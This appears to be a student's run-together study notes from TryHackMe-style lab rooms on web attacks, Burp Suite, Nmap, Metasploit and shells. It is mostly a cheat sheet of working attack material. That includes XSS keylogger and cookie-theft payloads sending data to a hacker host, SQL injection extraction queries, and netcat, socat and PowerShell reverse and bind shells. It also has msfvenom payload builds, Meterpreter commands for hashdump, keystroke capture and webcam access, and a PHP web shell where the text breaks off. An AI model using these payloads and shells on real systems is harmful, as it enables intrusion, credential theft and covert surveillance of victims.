http://webapp.htm/get.php?file=http://attacker.thm/cmd.txtSSRF  server side request forgery  2 types: regular, blind.    requestbin.comXSS  cross-site scripting  Key Logger js: document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}  Session Stealing js: fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));DOM Based XSS  DOM: https://www.w3.org/TR/REC-DOM-Level-1/introduction.html  window.location.hash parameter.  js: eval() function is very vulnerable.Blind Xss  https://xsshunter.com/  /images/cat.jpg\" onload=\"alert('HTM'); When upload an image, but server filter ‘&lt;’ and ‘&gt;’, we can use onload function.Polyglots:  Can help you bypass all filters.  jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\\x3e  https://blog.ostorlab.co/polyglot-xss.htmlGet cookie from xss:  net cat: nc -nlvp 9001 start server.  fetch('http://{URL_OR_IP}:9001?cookie=' + btoa(document.cookie) );  wait for the victim.Command Injection  also often known as “Remote Code Execution” (RCE)  https://owasp.org/www-project-top-ten/  https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report  php vulnerable functions: Exec, Passthru, System  php: filter_input https://www.php.net/manual/en/function.filter-input.php  use hexadecimal value to bypass the filter.  cheat sheet for more payloads: https://github.com/payloadbox/command-injection-payload-listSQL Injection  Structured Query Language  select * from users where username like 'a%'; returns any rows with username beginning with the letter a.  select * from users where username like '%n';  ending with the letter n.  select * from users where username like '%mi%'; characters mi within them.Union  SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;Insert  insert into users (username,password) values ('bob','password123');Update  update users SET username='root',password='pass123' where username='admin';Delete  delete from users where username='martin';In-Band SQL Injection  select * from article where id = 0 UNION SELECT 1,2,database()  get database name  select * from article where id = 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'  get table names in the database “sqli_one”  select * from article where id = 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'  get column names in the table “staff_users”  select * from article where id = 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_usersBlind SQLi (Boolean Based)  select * from users where username = ‘A' UNION SELECT 1,2,3 WHERE database() like 's%';--’ LIMIT 1  we can try every possible combination to find the database`s name.Blind SQLi (Time base)The table has 2 columns.  admin123' UNION SELECT SLEEP(5);-- No sleep, just return.  admin123' UNION SELECT SLEEP(5),2;-- Sleep for 5 sconds.Out-of-Band SQLi:  attack channel could be a web request  data gathering channel could be monitoring HTTP/DNS requests made to a service you control.Remediation：  Prepared Statements (With Parameterized Queries)  Input Validation  Escaping User InputBurp Suite BasicExtensions  java, jython, jRuby  https://www.jython.org/  https://www.jruby.org/  Burp Suite Extender module: load extension, providing a marketplace.Proxy  https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-basic/  Intercept server response. Or Request Was Interceptedembeded browser  Project options -&gt; Misc -&gt; Embedded Browser and check the Allow the embedded browser to run without a sandbox  create a new user and run Burp Suite under a low privilege account.(security, recomanded)scope  after set scope, we need: Proxy Options sub-tab and select And URL Is in target scopePost modified request  URL encode: ctrl+UPOST /ticket/ HTTP/1.1Host: 10.10.117.83User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 37Origin: http://10.10.117.83Connection: closeReferer: http://10.10.117.83/ticket/Upgrade-Insecure-Requests: 1email=alert(\"Succ3ssful%2bXSS\")&amp;content=hack+test  “%2b” -&gt; “+”Brup Suite: Repeater  Another way: by hand, curl, https://curl.se/  0x0d -－”/r”  0x0a -－”/n”  each line of response ends with “/r/n”, same as “0d0a”.SQLi with repeater  query http://10.10.39.188/about/2' with a ' behind.  Invalid statement: SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'&lt;/code&gt;  The INFORMATION_SCHEMA Database: “This is the database about databases. It’s used to store details of other databases on the server”.  /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name=\"people\"  this requey can only retrieve one column_nmae of the people table.  MySQL GROUP_CONCAT() function returns a string with concatenated non-NULL value from a group.  Notice that we also changed the ID that we are selecting from 2 to 0. By setting the ID to an invalid number, we  ensure that we don’t retrieve anything with the original (legitimate) query; this means that the first row returned from the database will be our desired response from the injected query.  /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name=\"people\"  retrieve all columns name of people table.burpsuite intruder  Intruder is Burp Suite’s in-built fuzzing tool.  similar to Wfuzz or Ffuf.4 attacks:  sniper attack: pos1, pos2, 3 word a b c. Try: pos1,a; pos1,b; pos1,c;   a,pos2; b,pos2; c,pos2. One wordlist set.  Battering ram attack: puts the same payload in every position rather than in each position in turn. One wordlist set.  Pitchfork attack: uses one payload set per position. iterates through them all at once. Word lists should be identical length.  Cluster bomb attack: iterates through each payload set individually, making sure that every possible combination is tested.CSRF Token bypass:  a session cookie set in the response, as well as a CSRF (Cross-Site Request Forgery) token included in the form as a hidden field. If we refresh the page, we should see that both of these change with each request: this means that we will need to extract valid values for both every time we make a request.  Run macro to “Get” the session every time before intruder.  update current request with parameters matched from final macro response. (this case, the “session” parameter.)  Update current request with cookies from session handling cookie jar.  ref: https://portswigger.net/burp/documentation/desktop/options/sessions  csrf token: https://portswigger.net/web-security/csrf/tokensBurp Suite: Other ModulesDecoder  https://gchq.github.io/CyberChef/Sequencer  the effective entropy.Burp Suite: Extender  Burp Suite “BApp” store.  all traffic passing through Burp Suite will be passed through each extension in order, starting at the top of the list and working down.  https://github.com/portswigger/request-timer    Jython. https://www.jython.org/download. significantly increases the number of extensions available to us.  Jruby. https://www.jruby.org/download.Write extender:  https://portswigger.net/burp/extender/writing-your-first-burp-suite-extensionPassive ReconnaissanceThe Unified Kill Chain  https://www.unifiedkillchain.com/whois  https://www.ietf.org/rfc/rfc3912.txtNmap Live Host Discoverynslookup and dig  nslookup tryhackme.com  nslookup -type=A tryhackme.com 1.1.1.1 find ipv4 in 1.1.1.1  dig tryhackme.com MX  dig @1.1.1.1 tryhackme.com MX  dig thmlabs.com txtDNS records can find more information, like subdomain, especially which not updated regularly.dnsdumpster  https://dnsdumpster.com/Shodan.io  https://help.shodan.io/the-basics/search-query-fundamentals  https://tryhackme.com/room/shodanActive Reconnaissanceweb browser  FoxyProxy(add-one):https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/  User-Agent Switcher and Manager: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/  Wappalyzer https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/  ctrl+shift+I: sources -&gt; script.jspingcount (2 are same)  ping -n 10 10.10.117.50 on MS Windows system.  ping -c 10 10.10.117.50 on Linux or Mac OS.Traceroute  when TTL reaches 0, an ICMP Time-to-Live exceeded would be sent to the original sender.  On linux, traceroute is send in UDP datagrams.Telnet  use Telnet to connect to any service and grab its banner.(not it designed for.)  telnet 10.10.117.50 80 then GET / HTTP/1.1  get the service information.NetcatGET  Netcat supports both TCP and UDP protocols.  nc 10.10.108.61 PORT hostname:abc then, SHIFT+ENTEROpen port and listen  nc -vnlp 1234  -l\tListen mode  -p\tSpecify the Port number  -n\tNumeric only; no resolution of hostnames via DNS  -v\tVerbose output (optional, yet useful to discover any bugs)  -vv\tVery Verbose (optional)  -k\tKeep listening after client disconnectsNmapuse list  nmap -iL list_of_hosts.txt -iL: input filename.ARP  nmap -PR -sn 192.168.0.1/24 -PR: indicates that you only want an ARP scan. -sn: No port scan.ICMP  nmap -PE -sn 192.168.0.1/24 -PE: ICMP.  Nmap didn’t need to send ICMP packets as it confirmed that these hosts are up based on the ARP responses it received.  if in same subnet, we can see the MAC address.TCP SYN  sudo nmap -PS -sn 192.168.1.1/24 -PS:  TCP SYN ping.  Normal syn ping do not need root user.  Privileged users (root and sudoers) can send TCP SYN packets and don’t need to complete the TCP 3-way handshake even if the port is open. Will send RST instead. Can avoid some firewall rules.  -PS21 target on port 21.  -PS21-25 21 to 25.TCP ACK  sudo nmap -PA -sn MACHINE_IP/24  need root.UDP  sudo nmap -PU -sn 10.10.68.220/24Reverse-DNS Lookup  Nmap’s default behaviour is to use reverse-DNS online hosts.  -n to skip this step.  -R to query the DNS server even for offline hostsNmap Basic Port ScansPort States:  Open  Closed  Filtered  Unfiltered                              Open          Filtered                                                  Closed          Filtered                    TCP header  https://datatracker.ietf.org/doc/html/rfc793.html    URG flag: set is processed immediately without consideration of having to wait on previously sent TCP segments.  Push flag： asking TCP to pass the data to the application promptly.TCP Scan  TCP connect scan. nmap -sT {target}  full 3-way handshake, then RST. Only possible TCP port scan if not root.  TCP SYN scan. nmap -sS {target} need root.UDP Scan  nmap -sU {target} Open: no response. Closed: ICMP destination unreachable.Scope and performance  -F most common 100 ports  -T0 scans one port at a time and waits 5 minutes  -T5 is the most aggressive in terms of speed  -T4 is often used during CTFs  --max-rate 10 or --max-rate=10 ensures that your scanner is not sending more than ten packets per second.  --min-parallelism=512 pushes Nmap to maintain at least 512 probes in parallel  -p- all ports.Nmap Advanced Port ScansNull Scan  sudo nmap -sN 10.10.22.67, all six flag bits are set to zero.                              closed: RST,ACK. open          filtered: no reply.                      need root.FIN Scan  sudo nmap -sF 10.10.22.67, FIN flag set.                              closed: RST,ACK. open          filtered: no reply.                    Xmas Scan  sudo nmap -sX 10.10.22.67, FIN, PSH, and URG flags set.                              closed: RST,ACK. open          filtered: no reply.                    Why:  A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt.  Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it.  However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.TCP Maimon Scan:  sudo nmap -sM 10.10.22.67, FIN and ACK bits are set.  no much use, open and close reply almost same.TCP ACK Scan:  sudo nmap -sA 10.10.22.67, ACK flag set.  can not find if port is open.  this type of scan is more suitable to discover firewall rule sets and configuration.  Result indicates that the firewall is blocking all other ports except for these three ports.Window Scan:  sudo nmap -sW 10.10.22.67, like ACK scan, with more examines the TCP Window field of the RST packets returned.  TCP window scan pointed that three ports are detected as closed.  Although we know that these three ports are closed, we realize they responded differently, indicating that the firewall does not block them.  ACK and window scans are exposing the firewall rules, not the services.Custom Scan:  sudo nmap --scanflags RSTSYNFIN {target}Spoofing and Decoys  nmap -S {SPOOFED_IP} 10.10.121.57  --spoof-mac SPOOFED_MAC This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).  nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.121.57 decoy, hide among other IPs. RND, random IP.Fragmented Packets  A traditional firewall inspects, at least, the IP header and the transport layer header.  A more sophisticated firewall would also try to examine the data carried by the transport layer.  sudo nmap -sS -p80 -f 10.20.30.144 8 bytes after IP header, in each packet.  sudo nmap -sS -p80 -ff 10.20.30.144 16 bytes after IP header, in each packet.  Nmap splits the packets into eight bytes or less after the IP header. So a 20-byte TCP header would be split into three packets.  The idea is to split up the TCP header over several packets to make it harder for packet filters, intrusion detection systems, and other annoyances to detect.Idle/Zombie Scan  nmap -sI ZOMBIE_IP 10.10.121.57  This is accomplished by checking the IP identification (IP ID) value in the IP header.More Details  sudo nmap -sS --reason 10.10.252.27 get .  -v for verbose output or -vv for even more verbosity.  -d for debugging details or -dd for even more details.Nmap Post Port ScansOS Detection and Traceroute  sudo nmap -sV 10.10.129.53 Version detection.  sudo nmap -sS -O 10.10.129.53 OS detection.  nmap -sS --traceroute 10.10.129.53 traceroute, Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap’s traceroute starts with a packet of high TTL and keeps decreasing it.Nmap Scripting Engine (NSE)  Lua language.  path: /usr/share/nmap/scripts  -sC Default scriptsScript Category\tDescription  auth\tAuthentication related scripts  broadcast\tDiscover hosts by sending broadcast messages  brute\tPerforms brute-force password auditing against logins  default\tDefault scripts, same as -sC  discovery\tRetrieve accessible information, such as database tables and DNS names  dos\tDetects servers vulnerable to Denial of Service (DoS)  exploit\tAttempts to exploit various vulnerable services  external\tChecks using a third-party service, such as Geoplugin and Virustotal  fuzzer\tLaunch fuzzing attacks  intrusive\tIntrusive scripts such as brute-force attacks and exploitation  malware\tScans for backdoors  safe\tSafe scripts that won’t crash the target  version\tRetrieve service versions  vuln\tChecks for vulnerabilities or exploit vulnerable serviceshttp-date  sudo nmap -sS -n --script \"http-date\" 10.10.16.134find a certain script  /usr/share/nmap/scripts# find -name '*cve2015-1635*'  with ‘cve2015-1635’ in the middle of the file name.Saving the OutputNormal  -oN FILENAME, N stands for normalGrepable  -oG FILENAMEXML  -oX FILENAMEProtocols and Servershttp  telnet 10.10.115.51 80  GET /index.html HTTP/1.1  host: telnet  double ‘Enter’ftpUse telnet  File Transfer Protocol, cleartext  telnet 10.10.115.51 21  USER frank  PASS D2xc9CgD  STAT can provide some added information  SYST command shows the System Type of the target (UNIX in this case)  PASV switches the mode to passive. Active: port 20. Passive: ports above 1023.  TYPE A switches the file transfer mode to ASCII.  TYPE I switches the file transfer mode to binary.  we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.use ftp  ftp 10.10.115.51  ftp&gt; ls  ftp&gt; ascii  ftp&gt; get README.txt  ftp&gt; exit  ftp software: vsftpd, ProFTPD, uFTP. Some web browsers also support FTP protocol.SMTP4 components:  Mail Submission Agent (MSA)  Mail Transfer Agent (MTA):  (SMTP)  Mail Delivery Agent (MDA):  (POP3) or (IMAP)  Mail User Agent (MUA)SMTP  is used to communicate with an MTA server.  default port 25.  telnet MACHINE_IP 25POP3  your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages.  download the email messages from a Mail Delivery Agent (MDA) server  default port 110  telnet 10.10.124.6 110  USER frank  PASS D2xc9CgD  STATIMAP  Internet Message Access Protocol (IMAP)  default port 143  possible to keep your email synchronized across multiple devices (and mail clients), POP3 can not.  changes will be saved on the IMAP server (MDA)  telnet 10.10.124.6 143  LOGIN frank D2xc9CgDProtocols and Servers 2VS:  Confidentiality, Integrity,   Availability (CIA)  Disclosure,      Alternation, Destruction (DAD)Sniffing Attack  Tcpdump, Wireshark, Tshark  sudo tcpdump port 110 -A checking email messages using POP3, in ASCII format.  mitigation： Transport Layer Security (TLS) has been added to HTTP, FTP, SMTP, POP3, IMAP and many others.Man-in-the-Middle (MITM) Attack  Ettercap. https://www.ettercap-project.org/  Bettercap. https://www.bettercap.org/  With the help of Public Key Infrastructure (PKI) and trusted root certificates, Transport Layer Security (TLS) protects from MITM attacks.SSL, TSL are on presentation layer.  https://datatracker.ietf.org/doc/html/rfc6101ports:  HTTP\t80\tHTTPS\t443  FTP\t21\tFTPS\t990. secured using SSL/TLS  FTP   21\tSFTP\t22. secured using the SSH protocol, same port.  SMTP\t25\tSMTPS\t465  POP3\t110\tPOP3S\t995  IMAP\t143\tIMAPS\t993  DNS   DoT(DNS over TLS )  TELNET 23  SSH 22process:  Establish a TCP connection  Establish SSL/TLS connection  Send HTTP requests to the webserverSSH:  port 22.  ssh username@10.10.202.115SCP:  can use SSH to transfer files using SCP (Secure Copy Protocol) based on the SSH protocol  scp mark@10.10.202.115:/home/mark/archive.tar.gz ~ remote to local  scp backup.tar.bz2 mark@10.10.202.115:/home/mark/ local to remotePassword Attack  Hydra. https://github.com/vanhauser-thc/thc-hydra  hydra -l username -P wordlist.txt server service  server: the hostname or IP address of the target server.  service: the service which you are trying to launch the dictionary attack.  -s PORT Use in case of non-default service port number  -d Display debugging output if the verbose output is not helping  -V or -vV Show the username and password combinations being triedVulnerabilities 101types  Operating System  (Mis)Configuration-based  Weak or Default Credentials  Application Logic  Human-FactorScoring VulnerabilitiesCVSS  https://www.kennasecurity.com/resources/prioritization-to-prediction-report/  CVSS, https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator  open source, VPR not.  start in 2005.VPR  Vulnerability Priority Rating.  takes into account the relevancy of a vulnerability, while CVSS does not.Vulnerability DatabasesNVD  NVD (National Vulnerability Database) https://nvd.nist.gov/vuln/full-listing  “Common Vulnerabilities and Exposures” (Or CVE for short)  wanna cry: CVE-2017-0144Exploit-DB  https://www.exploit-db.com/Exploit VulnerabilitiesAutomated Vs. Manual Vulnerability Research  nessus. https://www.tenable.com/products/nessusVulnerability types:  Security Misconfigurations  Broken Access Control  Insecure Deserialization  InjectionFinding Manual Exploits  Rapid7, https://www.rapid7.com/db/  GitHub, search GitHub by keywords such as “PoC”, “vulnerability”  Searchsploit, offline copy of Exploit-DB  searchsploit online book store search the service “online book store”  searchsploit -m php/webapps/47887.py copy the exploit  python 47887.py http://10.10.18.54 run the exploitMetasploit: Introductionmain components  msfconsole: The main command-line interface.  Modules: supporting modules such as exploits, scanners, payloads, etc.  Tools: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset.components  /opt/metasploit-framework-5101/modules/  Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.  Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.  Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.  Exploits: Exploits, neatly organized by target system.  NOPs: NOPs (No OPeration) do nothing, literally.  Payloads: Payloads are codes that will run on the target system. singles; stagers -&gt; stages.  “generic/shell_reverse_tcp”, inline (or single) payload  “windows/x64/shell/reverse_tcp”, staged payload  Post: useful on the final stage of the penetration testing process listed above, post-exploitation.msfconsole  msf6 &gt; help set  msf6 &gt; history  msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads  payloads that can be used with the ms17-010 Eternalblue exploit.  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; info display detailed information  msf6 &gt; search ms17-010 searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.  use 0 use the listed number.  msf6 &gt; search type:auxiliary telnet search results to only include auxiliary module.  msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; unset allMetasploit: ExploitationTCP scan  msf6 &gt; search portscan  msf6 auxiliary(scanner/portscan/tcp) &gt; show optionsUDP  msf6 auxiliary(scanner/discovery/udp_sweep) &gt; runSMB Scans  msf6 auxiliary(scanner/smb/smb_version) &gt; runMetasploit Database  systemctl start postgresql  msfdb init  msf6 &gt; db_status  msf6 &gt; workspace  msf6 &gt; workspace -a tryhackme add; -d delete  workspace -hdb_nmap  msf6 &gt; db_nmap -sV -p- 10.10.12.229 run nmap, result saved to the database.  msf6 &gt; hosts, msf6 &gt; services show saved information.  hosts -h, services -husage  use auxiliary/scanner/smb/smb_ms17_010  hosts -R add hosts value to the RHOSTS parameter  msf6 &gt; services -S netbios search “netbios” in serviceslow-hanging fruits  HTTP, FTP, SMB, SSH, RDPExploitation  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads list other commands you can use with that specific exploit.  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 2  background it using CTRL+Z or abort it using CTRL+C  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions show sessions, include background.Working with sessions  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -h help  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i 1 interact with session 1.example  nmap -sC -sV -p- -T4 --min-rate=9326 -vv [MACHINE IP]Msfvenom  Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).  # msfvenom -l payloads  # msfvenom --list formatsencode  # msfvenom -p php/meterpreter/reverse_tcp LHOST={IP} -f raw -e php/base64 The PHP version of Meterpreter was encoded in Base64, and the output format was raw.Handlers  The term commonly used to receive a connection from a target is ‘catching a shell’.  Can be easily caught using a handler.  # msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw &gt; reverse_shell.php  use exploit/multi/handler Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.Other Payloads  Linux Executable and Linkable Format (elf)  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf  set payload linux/x86/meterpreter/reverse_tcp  Windows  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe  PHP  msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php  ASP  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp  Python  msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.pytransfer  python3 -m http.server 9000  wget http://ATTACKING_10.10.217.15:9000/shell.elfMeterpreter  runs in target memory and does not write itself to the disk on the target, avoid detecion  Meterpreter will be seen as a process and not have a file on the target system.show different meterpreter version  # msfvenom --list payloads | grep meterpreterHow to choose version:  The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)  Components available on the target system (Is Python installed? Is this a PHP website? etc.)  Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)Meterpreter Commands  helpCore commands  background: Backgrounds the current session  exit: Terminate the Meterpreter session  guid: Get the session GUID (Globally Unique Identifier)  help: Displays the help menu  info: Displays information about a Post module  irb: Opens an interactive Ruby shell on the current session  load: Loads one or more Meterpreter extensions  migrate: Allows you to migrate Meterpreter to another process  run: Executes a Meterpreter script or Post module  sessions: Quickly switch to another sessionFile system commands  cd: Will change directory  ls: Will list files in the current directory (dir will also work)  pwd: Prints the current working directory  edit: will allow you to edit a file  cat: Will show the contents of a file to the screen  rm: Will delete the specified file  search: Will search for files  upload: Will upload a file or directory  download: Will download a file or directoryNetworking commands  arp: Displays the host ARP (Address Resolution Protocol) cache  ifconfig: Displays network interfaces available on the target system  netstat: Displays the network connections  portfwd: Forwards a local port to a remote service  route: Allows you to view and modify the routing tableSystem commands  clearev: Clears the event logs  execute: Executes a command  getpid: Shows the current process identifier  getuid: Shows the user that Meterpreter is running as  kill: Terminates a process  pkill: Terminates processes by name  ps: Lists running processes  reboot: Reboots the remote computer  shell: Drops into a system command shell  shutdown: Shuts down the remote computer  sysinfo: Gets information about the remote system, such as OSOthers Commands (these will be listed under different menu categories in the help menu)  idletime: Returns the number of seconds the remote user has been idle  keyscan_dump: Dumps the keystroke buffer  keyscan_start: Starts capturing keystrokes  keyscan_stop: Stops capturing keystrokes  screenshare: Allows you to watch the remote user’s desktop in real time  screenshot: Grabs a screenshot of the interactive desktop  record_mic: Records audio from the default microphone for X seconds  webcam_chat: Starts a video chat  webcam_list: Lists webcams  webcam_snap: Takes a snapshot from the specified webcam  webcam_stream: Plays a video stream from the specified webcam  getsystem: Attempts to elevate your privilege to that of local system  hashdump: Dumps the contents of the SAM databasePost-Exploitation with Meterpreter  getuid  ps  migrate 716 Meterpreter migrating to process ID 716.  hashdump  list the content of the SAM database, SAM (Security Account Manager),  search -f flag2.txt quickly find a flag or proof file  shell  getsystem  load python  load kiwiusage on a WINDOWS machine  set payload windows/meterpreter/reverse_tcp  sysinfo  hashdump  post/windows/gather/enum_domain  post/windows/gather/enum_shares  post/windows/manage/migrate  NTLM hash, the second hash after command hashdump, what is the first.  meterpreter &gt; search -f secrets.txt  meterpreter &gt; cat \"{file_path}\"Shelltool: set up listener  Netcat, Socat, Metasploit – multi/handler,  PayloadsAllTheThings. Reverse Shell Cheat Sheet https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  pentestmonkey. Reverse Shell Cheat Sheet. https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  SecLists https://github.com/danielmiessler/SecListsTypes of ShellReverse shell.  attacker listen.  Reverse shells. need to configure your own network to accept the shell.  attack: sudo nc -lvnp 443  target: nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; -e /bin/bashBind shell.  target listen.  Bind shells. start a listener attached to a shell directly on the target.may be prevented by firewalls protecting the target.  target: nc -lvnp &lt;port&gt; -e \"cmd.exe\"  attacker: nc &lt;TARGET_IP&gt; &lt;port&gt;interactive or non-interactive  interactive: allow you to interact with programs after executing them.  Non-Interactive:Netcat  nc -lvnp &lt;port-number&gt; start listener of reverse shell  nc &lt;target-ip&gt; &lt;chosen-port&gt; obtain bind shellNetcat Shell StabilisationTechnique 1: Python  python -c 'import pty;pty.spawn(\"/bin/bash\")' spawn a better featured bash shell  export TERM=xterm able to use commands like clear  stty raw -echo; fg  Technique 2: rlwrap  gives us access to history, tab autocompletion and the arrow keys  sudo apt install rlwrap  rlwrap nc -lvnp &lt;port&gt; start listener  stty raw -echo; fgTechnique 3: Socat  socat static compiled binary (a version of the program compiled to have no dependencies)  sudo python3 -m http.server 80  wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat  Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\\\Windows\\temp\\socat.exechange your terminal tty size:  stty -a  stty rows &lt;number&gt;  stty cols &lt;number&gt;SocatReverse Shells  socat TCP-L:&lt;port&gt; - linux or windows  socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes Windows  socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:\"bash -li\" LinuxBind Shells  socat TCP-L:&lt;PORT&gt; EXEC:\"bash -li\" Linux  socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes Windows      socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; - linux or windows    socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0 listener  socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:\"bash -li\",pty,stderr,sigint,setsid,saneSocat Encrypted Shells  openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt Generate a certificate. creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.  cat shell.key shell.crt &gt; shell.pem merge two into a single filereverse shell  socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0 setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called “encrypt.pem”.  verify=0 tells the connection to not bother trying to validate.  certificate must be used on whichever device is listening.  socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash connect back  socat OPENSSL:10.10.10.5:53 EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane your IP is 10.10.10.5, the syntax to connect back to this listener.  Bind shell  socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes target.  socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 - attacker.Common Shell Payloads  nc -lvnp &lt;PORT&gt; -e /bin/bash bind shell on the target  nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash reverse shell, connect backcreate a listener for a bind shell:  mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f  creates a named pipe at /tmp/f  connects the input of the listener to the output of the named pipe.  output of the netcat listener (i.e. the commands we send) then gets piped directly into sh.  nc reverse shell:  mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f  reverse power shell on Windows:  powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"Other reverse shell:  PayloadsAllTheThings  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.mdmsfvenomstandard  msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;Windows x64 Reverse Shell  ```` msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST= LPORT= ```  -f: format  -o: outputstaged meterpreter reverse shell for a 64bit Linux target  msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443Payload Naming Conventions  OS/arch/payload  eg. linux/x86/shell_reverse_tcp  eg. windows/x64/meterpreter/reverse_tcp staged payload  eg. linux/x86/meterpreter_reverse_tcp stageless payloadlist payloads:  msfvenom --list payloads | grep \"linux/x86/meterpreter\"Metasploit multi/handler  3 options:  payload, LHOST and LPORT.  exploit -j run in background.WebShellsphp  &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt;  usage. input 